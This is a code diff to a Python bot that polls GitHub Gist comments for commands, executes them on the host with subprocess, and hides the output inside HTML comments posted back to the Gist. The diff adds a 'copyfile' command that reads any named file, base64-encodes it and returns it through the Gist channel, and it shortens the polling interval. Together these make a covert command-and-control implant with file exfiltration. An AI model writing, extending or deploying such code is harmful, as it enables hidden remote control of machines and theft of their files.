@@ -1,4 +1,5 @@
 #!/usr/bin/env python
+import base64
 import datetime
 import json
 import re
@@ -28,6 +29,11 @@ current_time = datetime.datetime.now()
 def switch(command):
     if command == 'bots':
         return str(BOT_ID)
+    elif command.startswith('copyfile '):
+        filename = command.split(' ')[1]
+        file_text = open(filename, 'rb')
+        file_read = file_text.read()
+        return base64.encodebytes(file_read)
     else:
         return subprocess.check_output([command])
 
@@ -57,8 +63,8 @@ def check_new_comments(sc, dt):
 
                 # print payload
                 payload = {
-                    "body": comment['body'] + " <!-- Bot ID: " + str(BOT_ID) + " | Command: " + str(
-                        command) + " | Output: " + str(output) + " -->"}
+                    "body": comment['body'] + " <!-- [" + str(datetime.datetime.now()) + "]" + " [bot " + str(BOT_ID) + "]> '" + str(
+                        command) + "' > " + str(output) + " -->"}
 
                 # make a POST request (create new comment in GitHub channel)
                 res = requests.patch(url + '/' + str(comment['id']), headers=headers, params=params, data=json.dumps(payload))
@@ -67,7 +73,7 @@ def check_new_comments(sc, dt):
                 print('Gist comment successfully updated!')
                 print(res.status_code)
 
-    sc.enter(randint(1, 10), 1, check_new_comments, (sc, datetime.datetime.now(),))
+    sc.enter(randint(1, 5), 1, check_new_comments, (sc, datetime.datetime.now(),))
 
 
 print('Starting bot with ID ' + str(BOT_ID))
